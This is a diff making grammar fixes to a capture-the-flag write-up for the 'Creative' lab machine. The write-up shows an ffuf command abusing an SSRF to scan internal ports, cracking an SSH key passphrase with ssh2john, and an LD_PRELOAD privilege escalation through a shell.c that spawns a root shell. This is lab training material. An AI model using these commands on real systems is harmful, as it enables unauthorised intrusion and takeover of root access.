@@ -47,20 +47,20 @@ Open `beta.creative.thm'
 
 ![](/commons/THM/Creative/1_SSRF.png)
 
-This site will test a url. **Command inject**, **SSRF**, **LFI** is first things in my mind.  
+This site will test a URL. **Command inject**, **SSRF**, **LFI** is first things in my mind.  
 
-After try some simple payload. I found **SSRF**. Check port on `127.0.0.1`
+After trying some simple payloads. I found **SSRF**. Check port on `127.0.0.1`
 
 ```shell
 ffuf -w /opt/SecLists/Fuzzing/5-digits-00000-99999.txt -u http://beta.creative.thm/ -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "url=http://127.0.0.1:FUZZ" -fw 3
 ```
 ![](/commons/THM/Creative/2_1337.png)
 
-After enumaration, we got id_rsa file.
+After enumeration, we got the id_rsa file.
 ![](/commons/THM/Creative/3_id_rsa.png)
 
-Login SSH with this key. It request a passphare. :))  
-We will try to use ssh2john to crack passphare of ssh. (Almost in CTF, rockyou.txt is your friend)  
+Login to SSH with this key. It requests a passphrase. :))  
+We will try to use ssh2john to crack the passphrase of ssh. (Almost in CTF, rockyou.txt is your friend)  
 
 ```shell
 ssh2john id_rsa > id_rsa.hash
@@ -71,16 +71,17 @@ ssh2john id_rsa > id_rsa.hash
 
 
 ## Privilege Escalation
+
 Login as `saad`, we found creds in .bash_history.
 ![](/commons/THM/Creative/5_creds.png)
 
 Check `sudo -l`
 ![](/commons/THM/Creative/6_ping.png)
 
-`/usr/bin/ping` can run as `root` but no command useful.  
-`env_keep+=LD_PRELOAD` we found an artic writes about [LPE using LD_Preload](https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/) 
+`/usr/bin/ping` can run as `root` but no command is useful.  
+`env_keep+=LD_PRELOAD` we found an article written about [LPE using LD_Preload](https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/) 
 
-1.Create a `shell.c`
+Create a `shell.c`
 
 ```c
 #include <stdio.h>
@@ -94,7 +95,7 @@ system("/bin/sh");
 }
 ```
 
-Compile it to generate a shared object with .so extension likewise .dll file in the Windows operating system and hence type following:
+Compile it to generate a shared object with .so extension likewise .dll file in the Windows operating system and hence type the following:
 
 ```shell
 gcc -fPIC -shared -o shell.so shell.c -nostartfiles
